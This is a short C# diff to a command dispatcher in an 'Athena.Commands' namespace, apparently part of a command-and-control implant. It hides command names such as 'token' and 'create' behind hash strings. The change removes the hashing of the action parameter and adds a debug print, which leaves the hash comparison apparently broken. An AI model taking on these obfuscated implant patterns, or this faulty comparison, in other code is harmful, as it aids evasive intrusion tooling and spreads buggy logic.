@@ -157,7 +157,8 @@ namespace Athena.Commands
 #if WINBUILD
                 case "94A08DA1FECBB6E8B46990538C7B50B2": //token
                     var tokenInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters);
-                    string action = ((string)tokenInfo["action"]).ToHash();
+                    string action = ((string)tokenInfo["action"]);
+                    Console.WriteLine(action);
 
                     if (action.IsEqualTo("76EA0BEBB3C22822B4F0DD9C9FD021C5")) //create
                     {
